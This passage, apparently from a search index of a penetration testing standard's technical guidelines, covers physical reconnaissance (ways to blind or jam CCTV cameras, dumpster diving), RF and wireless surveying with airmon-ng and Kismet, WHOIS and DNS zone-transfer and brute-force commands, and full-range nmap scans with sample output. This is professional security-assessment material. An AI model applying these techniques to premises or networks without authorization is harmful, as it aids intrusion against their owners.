can be of a conspicuous nature, which are used as a visible deterrence, as well as an inconspicuous nature. Surveillance/CCTV cameras are generally small high definition color cameras that can not only focus to resolve minute detail, but by linking the control of the cameras to a computer, objects can be tracked semi-automatically. Observing and documenting the Surveillance/CCTV system is critical for identifying the areas of coverage. While it might not be possible to determine the specific camera type being utilized or even the area of coverage it is possible to identify areas with or without limited coverage. It should be noted if the Surveillance/CCTV system is physically protected. If not, then it needs to be documented if the Surveillance/CCTV camera is vulnerable to someone deliberately destroying it. Additionally, a physically unprotected camera may be subject to blurring or blocking the image by spraying substances or obstructing the lens. Lasers can be used to blind or damage Surveillance/CCTV cameras. For wireless Surveillance/CCTV systems, broadcasting a signal at the same frequency as the wireless equipment could make it subject to jamming.","title":"Surveillance /CCTV systems"},{"location":"pentest_standard/tecguidelines/#access-control-devices","text":"Access control devices enable access control to areas and/or file_suport in a given facility. Access control refers to the practice of restricting entrance to a property, a building, or a room to authorized persons. Access control can be achieved by a human (a security guard, or receptionist), through mechanical means such as locks and keys, or through technological means such as access control systems like the Access control vestibule. Access control devices historically were accomplished through keys and locks. Electronic access control use is widely being implemented to replace mechanical keys. Access control readers are generally classified as Basic, Semi-intelligent, and Intelligent. A basic access control reader simply reads a card number or PIN and forward it to a control panel. The most popular type of access control readers are RF Tiny by RFLOGICS, ProxPoint by HID, and P300 by Farpointe Data. Semi-intelligent readers have inputs and outputs necessary to control door hardware (lock, door contact, exit button), but do not make any access decisions. Common Semi-intelligent readers are InfoProx Lite IPL200 by CEM Systems and AP-510 by Apollo. Intelligent readers have all the inputs and outputs necessary to control door hardware while having the memory and the processing power necessary to make access decisions independently of each other. Common Intelligent readers are the InfoProx IPO200 by CEM Systems, AP-500 by Apollo, PowerNet IP Reader by Isonas Security Systems, ID08 by Solus has the built in web service to make it user friendly, Edge ER40 reader by HID Global, LogLock and UNiLOCK by ASPiSYS Ltd, and BioEntry Plus reader by Suprema Inc. Some readers may have additional features such as an LCD and function buttons for data collection purposes (i.e. clock-in/clock-out events for attendance reports), camera/speaker/microphone for intercom, and smart card read/write support. Observe and document the type, number, and locations of access control devices in use.","title":"Access control devices"},{"location":"pentest_standard/tecguidelines/#environmental-design","text":"Environmental design involves the surrounding environmental of a building, or facility. In the scope of Physical security, environmental design includes facilities geography, landscape, architecture, and exterior design. Observing the facilities and surrounding areas can highlight potential areas of concern such as potential obscured areas due to geography and landscaping. Architecture and exterior design can impact the ability of security guards to protect property by creating areas of low or no-visibility. In addition, the placement of fences, storage containers, security guard shacks, barricades and maintenance areas could also prove useful in the ability move around a facility in a covert manner.","title":"Environmental Design"},{"location":"pentest_standard/tecguidelines/#employee-behavior","text":"Observing employees is often the one of the easier steps to perform. Employee actions generally provide insight into any corporate behaviors or acceptable norms. By observing, employees it is possible to determine procedures in use or establish ingress and egress traffic patterns. It is possible to utilize binoculars to observe any movement from a safe distance.","title":"Employee Behavior"},{"location":"pentest_standard/tecguidelines/#dumpster-diving","text":"Traditionally, most targets dispose of their trash in either garbage cans or dumpsters. These may or may not be separated based upon the recyclability of the material. The act of dumpster diving is the practice of sifting through commercial or residential trash to find items that have been discarded by their owners, but which may be useful. This is often times an extremely dirty process that can yield significant results. Dumpsters are usually located on private premises and therefore may subject the assessment team to potentially trespassing on property not owned by the target. Though the law is enforced with varying degrees of rigor, ensure that this is authorized as part of the engagement. Dumpster diving per se is often legal when not specifically prohibited by law. Rather than take the refuse from the area, it is commonly accepted to simply photograph the obtained material and then return it to the original dumpster.","title":"Dumpster diving"},{"location":"pentest_standard/tecguidelines/#rf-wireless-frequency-scanning","text":"A band is a section of the spectrum of radio communication frequencies, in which channels are usually used or set aside for the same purpose. To prevent interference and allow for efficient use of the radio spectrum, similar services are allocated in bands of non-overlapping ranges of frequencies. As a matter of convention, bands are divided at wavelengths of 10 n meters, or frequencies of 3?10 n hertz. For example, 30 MHz or 10 m divides shortwave (lower and longer) from VHF (shorter and higher). These are the parts of the radio spectrum, and not its frequency allocation. Each of these bands has a basic band plan which dictates how it is to be used and shared, to avoid interference, and to set protocol for the compatibility of transmitters and receivers. Within the US, band plans are allocated and controlled by the Federal Communications Commission (FCC). The chart below illustrates the current band plans. [[:File:Penetration_Testing_Execution_12.png|Screenshot Here]] To avoid confusion, there are two bands that we could focus on our efforts on. The band plans that would in of interest to an attacker are indicated in the following chart. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" |align # \"center\"| '''Band name''' |align # \"center\"| '''Abbr''' |align # \"center\"| '''ITU band''' |align # \"center\"| '''Frequency and wavelength in air''' |align # \"center\"| '''Example uses''' |- |Very high frequency |VHF |8 |30-300 MHz 10 m - 1 m |FM, television broadcasts and line-of-sight ground-to-aircraft and aircraft-to-aircraft communications. Land Mobile and Maritime Mobile communications, amateur radio, weather radio |- |Ultra high frequency |UHF |9 |300-3000 MHz 1 m - 100 mm |Television broadcasts, microwave ovens, mobile phones, wireless LAN, Bluetooth, ZigBee, GPS and two-way radios such as Land Mobile, FRS and GMRS radios, amateur radio |} A Radio Frequency (RF) site survey or wireless survey, sometimes called a wireless site survey, is the process of determining the frequencies in use within a given environment. When conducting a RF site survey, it's very important to identify an effective range boundary, which involves determining the SNR at various points around a facility. To expedite the process, all frequencies in use should be determined prior to arrival. Particular attention should be paid to security guards, and frequencies that the target is licensed to use. Several file_suport exist to assist in acquiring this information: {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Site''' | '''URL''' | '''Description''' |- |Radio Reference |[ http://www.radioreference.com/apps/db/ http://www.radioreference.com/apps/db/ ] |Free part of the site containing a wealth of information |- |National Radio Data |[ http://www.nationalradiodata.com/ http://www.nationalradiodata.com/ ] |FCC database search / $29 year |- |Percon Corp |[ http://www.perconcorp.com/ http://www.perconcorp.com ] |FCC database search / Paid site - custom rates |} [[:File:Penetration_Testing_Execution_13.png|Screenshot Here]] At a minimum a search engine (Google, Bing, and Yahoo!) should be utilized to conduct the following searches: \"Target Company\" scanner \"Target Company\" frequency \"Target Company\" guard frequency \"Target Company\" MHz Press releases from radio manufactures and reseller regarding the target Press releases from guard outsourcing companies talking about contracts with the target company","title":"RF / Wireless Frequency scanning"},{"location":"pentest_standard/tecguidelines/#frequency-usage","text":"A frequency counter is an electronic instrument that is used for measuring the number of oscillations or pulses per second in a repetitive electronic signal. Using a Frequency counter or spectrum analyzer it is possible to identify the transmitting frequencies in use around the target facility. Common frequencies include the following: {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Band''' | '''Frequency Range''' |- |VHF |150 - 174 MHz |- |UHF |420 - 425 MHz |- |UHF |450 - 470 MHz |- |UHF |851 - 866 MHz |- |VHF |43.7- 50 MHz |- |UHF |902 - 928 MHz |- |UHF |2400 - 2483.5 MHz |} A spectrum analyzer can be used to visually illustrate the frequencies in use. These are usually targeting specific ranges that are generally more focused than a frequency counter. Below is an output from a spectrum analyzer that can clearly illustrate the frequencies in use. The sweep range for this analyzer is 2399-2485 MHz. [[:File:Penetration_Testing_Execution_14.png|Screenshot Here]] All frequency ranges in use in and around the target should be documented.","title":"Frequency Usage"},{"location":"pentest_standard/tecguidelines/#equipment-identification","text":"As part of the on-site survey, all radios and antennas in use should be identified. Including radio make and model as well as the length and type of antennas utilized. A few good file_suport are available to help you identify radio equipment: {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Site''' | '''URL''' | '''Description''' |- |HamRadio Outlet |[ http://www.hamradio.com/ http://www.hamradio.com ] |A great source of information for amateur radios |- |BatLabs |[ http://www.batlabs.com/ http://www.batlabs.com ] |A great source of information for Motorola two way systems |} Identifying 802.11 equipment is usually much easier to accomplish, if not visually, then via RF emissions. For visual identification, most vendor websites can be searched to identify the specific make and model of the equipment in use. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Manufacturer''' | '''URL''' |- |3com |[ http://www.3com.com/ http://www.3com.com ] |- |Apple |[ http://www.apple.com/ http://www.apple.com ] |- |Aruba |[ http://www.arubanetworks.com/ http://www.arubanetworks.com ] |- |Atheros |[ http://www.atheros.com/ http://www.atheros.com/ ] |- |Belkin |[ http://www.belkin.com/ http://www.belkin.com ] |- |Bluesocket |[ http://www.bluesocket.com/ http://www.bluesocket.com/ ] |- |Buffalo Technology |[ http://www.buffalotech.com/ http://www.buffalotech.com ] |- |Cisco |[ http://www.cisco.com/ http://www.cisco.com ] |- |Colubris |[ http://www.colubris.com/ http://www.colubris.com/ ] |- |D-Link |[ http://www.dlink.com/ http://www.dlink.com ] |- |Engenius Tech |[ http://www.engeniustech.com/ http://www.engeniustech.com ] |- |Enterasys |[ http://www.enterasys.com/ http://www.enterasys.com ] |- |Hewlett Packard |[ http://www.hp.com/ http://www.hp.com ] |- |Juniper |[ http://www.juniper.net/ http://www.juniper.net ] |- |Marvell |[ http://www.marvell.com/ http://www.marvell.com ] |- |Motorola |[ http://www.motorola.com/ http://www.motorola.com ] |- |Netgear |[ http://www.netgear.com/ http://www.netgear.com ] |- |Ruckus Wireless |[ http://www.ruckuswireless.com/ http://www.ruckuswireless.com/ ] |- |SMC |[ http://www.smc.com/ http://www.smc.com ] |- |Trapeze |[ http://www.trapezenetworks.com/ http://www.trapezenetworks.com/ ] |- |TRENDnet |[ http://www.trendnet.com/ http://www.trendnet.com ] |- |Versa Technology |[ http://www.versatek.com/ http://www.versatek.com ] |} In a passive manner, it is possible to identify at the manufacturer based upon data collected from RF emissions. Wireless Local Area Network (WLAN) discovery consists of enumerating the type of WLAN that is currently deployed. This can be one of the following: Unencrypted WLAN, WEP encrypted WLAN, WPA / WPA2 encrypted WLAN, LEAP encrypted WLAN, or 802.1x WLAN. The tools required to enumerate this information are highlighted as follows.","title":"Equipment Identification"},{"location":"pentest_standard/tecguidelines/#airmon-ng","text":"Airmon-ng is used to enable monitor mode on wireless interfaces. It may also be used to go back from monitor mode to managed mode. It is important to determine if our USB devices are properly detected. For this we can use lsusb, to list the currently detected USB devices. [[:File:Penetration_Testing_Execution_15.png|Screenshot Here]] As the figure illustrates, our distribution has detected not only the Prolific PL2303 Serial Port, where we have our USB GPS connected, but also the Realtek RTL8187 Wireless Adapter. Now that we have determined that our distribution recognizes the installed devices, we need to determine if the wireless adapter is already in monitor mode by running. Entering the airmon-ng command without parameters will show the interfaces status. [[:File:Penetration_Testing_Execution_16.png|Screenshot Here]] To use one interface simply use airmon-ng to put your card in monitor mode by running: airmon-ng start wlan0 [[:File:Penetration_Testing_Execution_17.png|Screenshot Here]] If there's an existing mon0, destroy it prior to issuing the previous command: airmon-ng stop mon0 Once again, entering the airmon-ng command without parameters will show the interfaces status. [[:File:Penetration_Testing_Execution_18.png|Screenshot Here]]","title":"Airmon-ng"},{"location":"pentest_standard/tecguidelines/#airodump-ng","text":"Airodump-ng is part of the Aircrack-ng is a network software suite. Specifically, Airodump-ng is a packet sniffer that places air traffic into Packet Capture (PCAP) files or Initialization Vectors (IVS) files and shows information about wireless networks. Airodump-ng is used for packet capture of raw 802.11 frames and is particularly suitable for collecting WEP IVs (Initialization Vectors) for later use with Aircrack-ng. If you have a GPS receiver connected to the computer, Airodump-ng is capable of logging the coordinates of the found APs. Before running Airodump-ng, start the Airmon-ng script to list the detected wireless interfaces. Usage: airodump-ng < options > < interface > [ , < interface > ... ] Options: --ivs : Save only captured IVs --gpsd : Use GPSd --write < prefix > : Dump file prefix -w : same as --write --beacons : Record all beacons in dump file --update < secs > : Display update delay in seconds --showack : Prints ack/cts/rts statistics -h : Hides known stations for --showack -f < msecs > : Time in ms between hopping channels --berlin < secs > : Time before removing the AP/client from the screen when no more packets are received (Default: 120 seconds) -r < file > : Read packets from that file -x < msecs > : Active Scanning Simulation --output-format < formats > : Output format. Possible values: pcap, ivs, csv, gps, kismet, netxml Short format \"-o\" The option can be specified multiple times. In this case, each file format specified will be output. Only ivs or pcap can be used, not both. Airodump-ng will display a list of detected APs and a list of connected clients (\"stations\"). [[:File:Penetration_Testing_Execution_19.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_20.png|Screenshot Here]] The first line shows the current channel, elapsed running time, current date and optionally if a WPA/WPA2 handshake was detected.","title":"Airodump-ng"},{"location":"pentest_standard/tecguidelines/#kismet-newcore","text":"Kismet-newcore is a network detector, packet sniffer, and intrusion detection system for 802.11 wireless LANs. Kismet will work with any wireless card which supports raw monitoring mode, and can sniff 802.11a, 802.11b, 802.11g, and 802.11n traffic. Kismet identifies networks by passively collecting packets and detecting standard named networks, detecting (and given time, decloaking) hidden networks, and inferring the presence of nonbeaconing networks via data traffic. Kismet is composed of 3 parts: '''Drones: '''Capture the wireless traffic to report it to the server; they have to be started manually. '''Server: '''Central place that connects to the drones and accepts client connections. It can also capture wireless traffic. '''Client: '''The GUI part that will connect to the server. Kismet has to be configured to work properly. First, we need to determine if it is already in monitor mode by running: airmon-ng [[:File:Penetration_Testing_Execution_21.png|Screenshot Here]] To use one interface simply use airmon-ng to put your card in monitor mode by running: airmon-ng start wlan0 [[:File:Penetration_Testing_Execution_22.png|Screenshot Here]] If there's an existing mon0, destroy it prior to issuing the previous command: airmon-ng stop mon0 Kismet is able to use more than one interface like Airodump-ng. To use that feature, /etc/kismet/kismet.conf has to be edited manually as airmon-ng cannot configure more than one interface for kismet. For each adapter, add a source line into kismet.conf. Note:''' '''By default kismet stores its capture files in the directory where it is started. These captures can be used with Aircrack-ng. Typing, \"kismet\" in a console and hitting \"Enter\" will start up Kismet. [[:File:Penetration_Testing_Execution_23.png|Screenshot Here]] As described earlier Kismet consists of three components and the initial screen informs us that we need to either start the Kismet server or choose to use a server that has been started elsewhere. For our purposes. we will click \"Yes\" to start the Kismet server locally. [[:File:Penetration_Testing_Execution_24.png|Screenshot Here]] Kismet presents us with the options to choose as part of the server startup process. [[:File:Penetration_Testing_Execution_25.png|Screenshot Here]] Unless we configured a source in /etc/kismet/kismet.conf then we will need to specify a source from where we want to capture packets. [[:File:Penetration_Testing_Execution_26.png|Screenshot Here]] As referenced earlier, we created a monitor sub-interface from our wireless interface. For our purposes, we will enter \"mon0\", though your interface may have a completely different name. [[:File:Penetration_Testing_Execution_27.png|Screenshot Here]] When Kismet server and client are running properly then wireless networks should start to show up. We have highlighted a WEP enabled network. There are numerous sorting options that you can choose from. We will not cover all the functionality of Kismet at this point, but if you're not familiar with the interface you should play with it until you get comfortable.","title":"Kismet-Newcore"},{"location":"pentest_standard/tecguidelines/#inssider","text":"If you are used to using Netstumbler you may be disappointed to hear that it doesn't function properly with Windows Vista and 7 (64-bit). That being said, all is not lost as there is an alternative that is compatible with Windows XP, Vista and 7 (32 and 64-bit). It makes use of the native Wi-Fi API and is compatible with most GPS devices (NMEA v2.3 and higher). InSSIDer has some features that make it the tool of choice if you're using Windows. InSSIDer can track the strength of received signal in dBi over time, filter access points, and also export Wi-Fi and GPS data to a KML file to view in Google Earth. [[:File:Penetration_Testing_Execution_28.png|Screenshot Here]]","title":"inSSIDer"},{"location":"pentest_standard/tecguidelines/#external-footprinting","text":"The External Footprinting phase of Intelligence Gathering involves collecting response results from a target based upon direct interaction from an external perspective. The goal is to gather as much information about the target as possible.","title":"External Footprinting"},{"location":"pentest_standard/tecguidelines/#identifying-ip-ranges","text":"For external footprinting, we first need to determine which one of the WHOIS servers contains the information we're after. Given that we should know the TLD for the target domain, we simply have to locate the Registrar that the target domain is registered with. WHOIS information is based upon a tree hierarchy. ICANN (IANA) is the authoritative registry for all of the TLDs and is a great starting point for all manual WHOIS queries.","title":"Identifying IP Ranges"},{"location":"pentest_standard/tecguidelines/#whois-lookup","text":"ICANN - http://www.icann.org IANA - http://www.iana.com NRO - http://www.nro.net AFRINIC - http://www.afrinic.net APNIC - http://www.apnic.net ARIN - http://ws.arin.net LACNIC - http://www.lacnic.net RIPE - http://www.ripe.net Once the appropriate Registrar was queried we can obtain the Registrant information. There are numerous sites that offer WHOIS information; however for accuracy in documentation, you need to use only the appropriate Registrar. InterNIC - http://www.internic.net/ http://www.internic.net ]","title":"WHOIS lookup"},{"location":"pentest_standard/tecguidelines/#bgp-looking-glasses","text":"It is possible to identify the Autonomous System Number (ASN) for networks that participate in Border Gateway Protocol (BGP). Since BGP route paths are advertised throughout the world we can find these by using a BGP4 and BGP6 looking glass. BGP4 - [ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg http][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg ://][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg www][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg .][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg bgp][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg 4.][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg as][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg /][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg looking][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg -][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg glasses] BPG6 - [ http://lg.he.net/ http://lg.he.net/ ]","title":"BGP looking glasses"},{"location":"pentest_standard/tecguidelines/#active-reconnaissance","text":"Manual browsing Google Hacking - [ http://www.exploit-db.com/google-dorks http://www.exploit-db.com/google-dorks ]","title":"Active Reconnaissance"},{"location":"pentest_standard/tecguidelines/#passive-reconnaissance","text":"Google Hacking - [ http://www.exploit-db.com/google-dorks http://www.exploit-db.com/google-dorks ]","title":"Passive Reconnaissance"},{"location":"pentest_standard/tecguidelines/#active-footprinting","text":"The active footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction.","title":"Active Footprinting"},{"location":"pentest_standard/tecguidelines/#zone-transfers","text":"DNS zone transfer, also known as AXFR, is a type of DNS transaction. It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers. Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR). There are numerous tools available to test the ability to perform a DNS zone transfer. Tools commonly used to perform zone transfers are host, dig, and nmap.","title":"Zone Transfers"},{"location":"pentest_standard/tecguidelines/#host","text":"host < domain > < DNS server >","title":"Host"},{"location":"pentest_standard/tecguidelines/#dig","text":"dig @server domain axfr","title":"Dig"},{"location":"pentest_standard/tecguidelines/#reverse-dns","text":"Reverse DNS can be used to obtain valid server names in use within an organizational. There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address. If it does resolve then the results are returned. This is usually performed by testing the server with various IP addresses to see if it returns any results.","title":"Reverse DNS"},{"location":"pentest_standard/tecguidelines/#dns-bruting","text":"After identifying all the information that is associated with the client domain(s), it is now time to begin to query DNS. Since DNS is used to map IP addresses to hostnames, and vice versa we will want to see if it is insecurely configure. We will seek to use DNS to reveal additional information about the client. One of the most serious misconfigurations involving DNS is allowing Internet users to perform a DNS zone transfer. There are several tools that we can use to enumerate DNS to not only check for the ability to perform zone transfers, but to potentially discover additional host names that are not commonly known.","title":"DNS Bruting"},{"location":"pentest_standard/tecguidelines/#fierce2-linux","text":"For DNS enumeration, there are two tools that are utilized to provide the desired results. The first that we will focus on is named Fierce2. As you can probably guess, this is a modification on Fierce. Fierce2 has lots of options, but the one that we want to focus on attempts to perform a zone transfer. If that is not possible, then it performs DNS queries using various server names in an effort to enumerate the host names that have been registered. The command to run ''fierce2'' is as follows: fierce -dns < client domain > -prefix < wordlist > ''' [[:File:Penetration_Testing_Execution_29.png|Screenshot Here]] ''' There is a common prefix (called common-tla.txt) wordlist that has been composed to utilize as a list when enumerating any DNS entries. This can be found at the following URL: :https://address-unknown/","title":"Fierce2 (Linux)"},{"location":"pentest_standard/tecguidelines/#dnsenum-linux","text":"An alternative to Fierce2 for DNS enumeration is DNSEnum. As you can probably guess, this is very similar to Fierce2. DNSEnum offers the ability to enumerate DNS through brute forcing subdomains, performing reverse lookups, listing domain network ranges, and performing whois queries. It also performs Google scraping for additional names to query. ''' [[:File:Penetration_Testing_Execution_30.png|Screenshot Here]] ''' The command to run ''dnsenum'' is as follows: dnsenum -enum -f < wordlist > < client domain > ''' [[:File:Penetration_Testing_Execution_31.png|Screenshot Here]] ''' Again, there is a common prefix wordlist that has been composed to utilize as a list when enumerating any DNS entries. This can be found at the following URL: :https://address-unknown/","title":"DNSEnum (Linux)"},{"location":"pentest_standard/tecguidelines/#dnsdict6-linux","text":"Dnsdict6, which is part of the THC IPv6 Attack Toolkit, is an IPv6 DNS dictionary brute forcer. The options are relatively simple, but simply specify the domain and a dictionary-file. [[:File:Penetration_Testing_Execution_32.png|Screenshot Here]]","title":"Dnsdict6 (Linux)"},{"location":"pentest_standard/tecguidelines/#port-scanning","text":"","title":"Port Scanning"},{"location":"pentest_standard/tecguidelines/#nmap-windowslinux","text":"Nmap (\"Network Mapper\") is the de facto standard for network auditing/scanning. Nmap runs on both Linux and Windows. Nmap is available in both command line and GUI versions. For the sake of this document, we will only cover the command line. Nmap 5.51 ( http://nmap.org ) Usage: nmap [Scan Type(s)] [Options] {target specification} TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL : Input from list of hosts/networks -iR : Choose random targets --exclude : Exclude hosts/networks --excludefile : Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers : Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags : Customize TCP scan flags -sI : Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b : FTP bounce scan PORT SPECIFICATION AND SCAN ORDER: -p : Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports : Scan most common ports --port-ratio : Scan ports more common than SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity : Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) SCRIPT SCAN: -sC: equivalent to --script#default --script# : is a comma separated list of directories, script-files or script-categories --script-args# : provide arguments to scripts --script-trace: Show all data sent and received --script-updatedb: Update the script database. OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively TIMING AND PERFORMANCE: Options which take are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T < 0-5>: Set timing template (higher is faster) --min-hostgroup/max-hostgroup : Parallel host scan group sizes --min-parallelism/max-parallelism : Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout : Specifies probe round trip time. --max-retries : Caps number of port scan probe retransmissions. --host-timeout : Give up on target after this long --scan-delay/--max-scan-delay : Adjust delay between probes --min-rate : Send packets no slower than per second --max-rate : Send packets no faster than per second FIREWALL/IDS EVASION AND SPOOFING: -f; --mtu : fragment packets (optionally w/given MTU) -D : Cloak a scan with decoys -S : Spoof source address -e : Use specified interface -g/--source-port : Use given port number --data-length : Append random data to sent packets --ip-options : Send packets with specified ip options --ttl : Set IP time-to-live field --spoof-mac : Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksum OUTPUT: -oN/-oX/-oS/-oG : Output scan in normal, XML, s| : Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --log-errors: Log errors/warnings to the normal-format output file --append-output: Append to rather than clobber specified output files --resume : Resume an aborted scan --stylesheet : XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir : Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page. EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80 SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. Based on the IP set being assessed you would want to scan both the TCP and UDP ports across the range 1 to 65535. The command that will be utilized is as follows: nmap -A -PN -sU -sS -T2 -v -p 1-65535 < client ip range > / < CIDR > or < Mask > -oA NMap_FULL_ < client ip range > nmap -A -PN -sU -sS -T2 -v -p 1-65535 client.com -oA NMap_FULL_client Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:27 Eastern Daylight Time NSE: Loaded 57 scripts for scanning. Initiating Parallel DNS resolution of 1 host. at 22:27 Completed Parallel DNS resolution of 1 host. at 22:27, 0.10s elapsed Initiating SYN Stealth Scan at 22:27 Scanning client.com (74.117.116.73) [65535 ports] Discovered open port 80/tcp on 74.117.116.73 On large IP sets, those greater than 100 IP addresses, do not specify a port range. The command that will be utilized is as follows: nmap -A -O -PN < client ip range > / < CIDR > or < Mask > -oA NMap_ < client ip range > nmap -A -O -PN client.com -oA NMap_client Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:37 Eastern Daylight Time Nmap scan report for client.com (74.117.116.73) Host is up (0.13s latency). rDNS record for 74.117.116.73: 74-117-116-73.parked.com Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.3 ((CentOS)) | http-robots.txt: 2 disallowed entries |_/click.php /ud.php |_http-title: client.com |_http-methods: No Allow or Public header in OPTIONS response (status code 200) |_http-favicon: Parked.com domain parking Warning: OSScan results may be unreliable because we could not find at least 1 o pen and 1 closed port Device type: general purpose Running (JUST GUESSING): Linux 2.6.X (92%), OpenBSD 4.X (88%), FreeBSD 6.X (88%) It should be noted that Nmap has limited options for IPv6. These include TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version detection. nmap -6 -sT -P0 fe80::80a5:26f2:8db7:5d04%12 Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:42 Eastern Daylight Time Nmap scan report for lancelot (fe80::80a5:26f2:8db7:5d04) Host is up (1.0s latency). Not shown: 988 closed ports PORT STATE SERVICE 135/tcp open msrpc 445/tcp open microsoft-ds 554/tcp open rtsp 2869/tcp open icslap 3389/tcp open ms-term-serv 5000/tcp open upnp 5001/tcp open commplex-link 5002/tcp open rfe 5003/tcp open filemaker 5004/tcp open avt-profile-1 5357/tcp open wsdapi 10243/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 287.05 seconds","title":"Nmap (Windows/Linux)"},{"location":"pentest_standard/tecguidelines/#snmp-sweeps","text":"SNMP sweeps are performed too as they offer tons of information about a specific system. The SNMP protocol is a stateless, datagram oriented protocol. Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports. This means that \"no response\" from a probed IP address can mean either of the following: machine unreachable SNMP server not running invalid community string the response datagram has not yet arrived","title":"SNMP Sweeps"},{"location":"pentest_standard/tecguidelines/#snmpenum-linux","text":"SNMPEnum is a perl script that sends SNMP requests to a single host, then waits for the response to come back and logs them. [[:File:Penetration_Testing_Execution_37.png|Screenshot Here]]","title":"SNMPEnum (Linux)"},{"location":"pentest_standard/tecguidelines/#smtp-bounce-back","text":"SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a (failed) Delivery Status Notification (DSN) message, a Non-Delivery Notification (NDN) or simply a bounce, is an automated electronic mail message from a mail system informing the 